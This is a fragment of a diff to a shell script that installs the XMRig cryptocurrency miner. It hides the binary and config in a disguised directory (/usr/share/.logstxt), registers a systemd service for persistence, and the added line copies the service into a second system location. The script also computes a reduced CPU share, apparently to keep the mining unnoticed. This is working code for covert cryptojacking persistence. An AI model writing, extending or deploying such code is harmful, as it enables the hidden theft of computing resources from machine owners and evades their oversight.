@@ -22,7 +22,7 @@ then
    touch xmrig.service
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
-   move=$(mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
+   move=$(cp xmrig.service /usr/lib/systemd && mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
    
    threads=$(lscpu -p | grep -c "^[0-9]") 
    tf=$(printf %.f "$((25 * $threads))e-2")
